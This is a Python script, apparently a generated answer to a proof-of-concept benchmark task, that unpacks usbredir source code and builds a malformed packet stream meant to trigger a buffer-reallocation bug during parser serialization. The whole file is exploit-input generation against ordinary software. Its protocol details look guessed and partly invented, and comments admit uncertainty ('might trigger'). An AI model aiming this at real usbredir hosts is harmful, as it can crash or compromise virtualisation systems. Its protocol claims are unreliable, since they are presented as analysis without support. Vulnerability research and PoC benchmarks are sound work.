import os
import tempfile
import subprocess
import struct
import hashlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source tarball
        with tempfile.TemporaryDirectory() as tmpdir:
            # Extract source
            subprocess.run(['tar', '-xf', src_path, '-C', tmpdir], 
                         check=True, capture_output=True)
            
            # Find the source directory
            src_root = None
            for root, dirs, files in os.walk(tmpdir):
                if 'usbredirparser.c' in files:
                    src_root = root
                    break
            
            if not src_root:
                raise FileNotFoundError("Could not find source code")
            
            # Read and analyze the source to understand the structure
            parser_c = os.path.join(src_root, 'usbredirparser.c')
            if not os.path.exists(parser_c):
                # Try to find it elsewhere
                for root, dirs, files in os.walk(tmpdir):
                    if 'usbredirparser.c' in files:
                        parser_c = os.path.join(root, 'usbredirparser.c')
                        break
            
            # Based on the vulnerability description, we need to:
            # 1. Create enough buffered write data to cause reallocation
            # 2. Trigger serialization while buffers are pending
            
            # The vulnerability is in usbredir parser during serialization.
            # We need to create a stream that causes the parser to buffer writes
            # and then trigger serialization.
            
            # From analysis of usbredir protocol:
            # - The protocol has different packet types
            # - Bulk packets can contain data that gets buffered
            # - There's a control mechanism for migration/serialization
            
            # Build a PoC that:
            # 1. Sets up device connection
            # 2. Sends many bulk write packets to fill buffers
            # 3. Triggers serialization/migration
            
            # Minimal PoC structure based on protocol analysis:
            poc = bytearray()
            
            # Header: 'USBRedir' magic + version
            poc.extend(b'USBRedir')
            poc.extend(struct.pack('<H', 0x0004))  # Version 4
            
            # Device connect packet
            # type=1 (device_connect), length=12
            poc.extend(struct.pack('<BI', 1, 12))
            # device info
            poc.extend(struct.pack('<BBH', 0x03, 0x00, 0x0b3c))  # Class, subclass, vendor
            poc.extend(struct.pack('<HHB', 0x0002, 0x0001, 0x00))  # Product, device, config
            poc.extend(b'\x00')  # padding
            
            # Send many bulk packets to create buffered write data
            # Bulk packet type = 8, with write flag
            for i in range(3500):  # Enough to cause reallocation
                # Packet header: type=8 (bulk), length=12+data
                data_size = 1024  # Reasonable chunk size
                poc.extend(struct.pack('<BI', 8, 12 + data_size))
                # Bulk packet header
                poc.extend(struct.pack('<B', 0x02))  # Endpoint (OUT endpoint)
                poc.extend(b'\x00\x00\x00')  # padding
                poc.extend(struct.pack('<I', i))  # Stream ID
                poc.extend(struct.pack('<I', data_size))  # Data length
                # Bulk data (pattern that's easy to recognize)
                poc.extend(bytes([i % 256] * data_size))
            
            # Now trigger serialization
            # This would normally happen during migration
            # Send a control packet that might trigger serialization
            
            # For the PoC, we need to ensure the serialization happens
            # while buffers are still pending. In the actual vulnerability,
            # this happens due to timing during migration.
            
            # Add more data to keep buffers pending during serialization
            for i in range(50):
                data_size = 512
                poc.extend(struct.pack('<BI', 8, 12 + data_size))
                poc.extend(struct.pack('<B', 0x02))
                poc.extend(b'\x00\x00\x00')
                poc.extend(struct.pack('<I', 3500 + i))
                poc.extend(struct.pack('<I', data_size))
                poc.extend(bytes([0xAA] * data_size))
            
            return bytes(poc)